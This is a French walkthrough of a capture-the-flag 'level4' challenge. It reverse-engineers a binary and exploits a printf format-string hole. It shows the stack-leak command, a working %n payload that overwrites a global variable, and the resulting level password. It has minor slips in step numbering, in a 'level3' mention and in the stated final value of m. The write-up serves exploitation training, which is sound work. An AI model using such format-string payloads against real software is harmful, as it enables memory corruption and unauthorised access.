# LEVEL 4
## Walkthrough

Voici les étapes suivit pour accéder au niveau supérieur, soit le `level5`.

1. Une fois connecté à la VM sur le `level4`, l'on retrouve un fichier `level4` situé à la racine du dossier utilisateur. Ce dernier s'avère être de nouveau un exécutable ELF (Executable and Linkable Format).

2. On extrait ce fichier sur la machine host soit en utilisant la commande `scp` soit en utilisant un logiciel créer à cet effet.

    ```sh
    > scp -P 4242 level4@127.0.0.1:level4 /path/on/machine/host
    ```

2. On ouvre ensuite ce fichier dans Ghidra et après analyse, on obtient le désassemblage ci-dessous (que l'on refactorise pour plus de clarté).

    ```sh
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>
    #include <unistd.h>
    #include <sys/types.h>

	void p(char *param_1)
    {
        printf(param_1);
    }

	int n(void)
    {
        int m;
        char local_20c[520];

        fgets(local_20c, 512, stdin); # x200 = 512
        p(local_20c);
        if (m == 16930116) { # 0x1025544 = 16930116
            system("/bin/cat /home/user/level5/.pass");
        }
        return EXIT_SUCCESS;
    }

	void main(void)
    {
        return n();
    }
	```

    À partir de ce désassemblage, on en déduit que le programme contient 3 fonctions : la fonction `main` et la fonction `n` qui, tout deux, ne prennent aucun paramètre. En revanche la fonction `p`, elle, prend une chaîne de caractères en paramètre.

    La fonction `main` appelle tout simplement la fonction `n` tandis que la fonction `n` lit une ligne de texte depuis l'entrée standard (`stdin`) dans un tampon `local_20c` et appelle ensuite la fonction `p` en passant cette ligne comme paramètre. La fonction `p` affiche tout simplement le paramètre à l'aide de `printf`. La fonction `n` va ensuite comparer la variable `m`, qui est de nouveau pas définit (qu'on suppose donc être une variable globale), par une valeur spécifique, soit `0x1025544` (`16930116` en décimale). Si cette condition s'avère être vrai, la fonction exécute la commande `système /bin/cat` pour afficher le mot de passe se trouvant dans le fichier `/home/user/level5/.pass`.

    De fait, l'idée ici est similaire à celle utilisée dans le niveau précédent : modifier la valeur de `m` pour rentrer dans la condition `m == 0x1025544` et afficher le mot de passe du niveau suivant.

5. Tout d'abord, nous allons récupérer l'adresse de la variable `m` en utilisant `gdb` sur l'exécutable `level4` et la commande `info variable`.

    ```sh
    > gdb level4
    > info variable
    [...]
		0x08049810  m
	[...]
    ```

6. On va ensuite utiliser, de nouveaux, unes des vulnérabilités de la fonction `prinft` afin d'obtenir l'emplacement de l'adresse à remplacer.

    ```sh
    > python -c "print 'AAAA' + ' %x ' * 24" | ./level4
    AAAA b7ff26b0  bffff794  b7fd0ff4  0  0  bffff758  804848d  bffff550  200  b7fd1ac0  b7ff37d0  41414141  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520
    ```

    On en déduit que :
    - `AAAA`: Le `AAAA` qu'on a injecté en premier ;
    - `41414141`: L'adresse de `AAAA` est a la 12e place.

7. Maintenant, que l'on connaît l'emplacement de l'adresse `AAAA` on peut générer le payload ci-dessous.

    ```sh
    > python -c "print '\x10\x98\x04\x08' + '%16930112u' + '%12\$n'" > /tmp/payload4
    ```

    On a :
    - `\x10\x98\x04\x08` : L'adresse de `m` en format little-endian ;
    - `%16930112u`: On injecte `16930112` caractères en utilisant directement le flag de `%d` ;
    - `%12`: On veut récupérer la valeur de la 12e adresse dans la stack, soit celle de `m` ;
    - `$n`: On compte le nombre de caractère stocké à cette adresse.

    En faisant tout ça, on met la valeur `16930112` dans la variable `m`.

    Warnings : Faire attention aux `"` et `'`, car avec le premier pas besoin de `\` devant `$n` alors qu'avec le second, il y en a besoin.

5. En suite, l'on va utiliser la chaîne de caractère précédemment généré afin d'exploiter les vulnérabilités de l'exécutable `level3`. En exploitant `level3` de cette manière, on s'assure que la variable `m` est bien égale à `16930112` permettant à la condition `m == 0x1025544` d'être vérifiée et d'ainsi pouvoir obtenir le mot de passe pour le niveau suivant.

    ```sh
	> cat /tmp/payload4 - | ./level4
	0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
	```

6. On peut à présent passer au niveau supérieur en exécutant la commande `su level5` et en y spécifiant le mot de passe qui vient d'être trouvée.
    ```sh
    > su level5
    Password :
    > 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
    ```
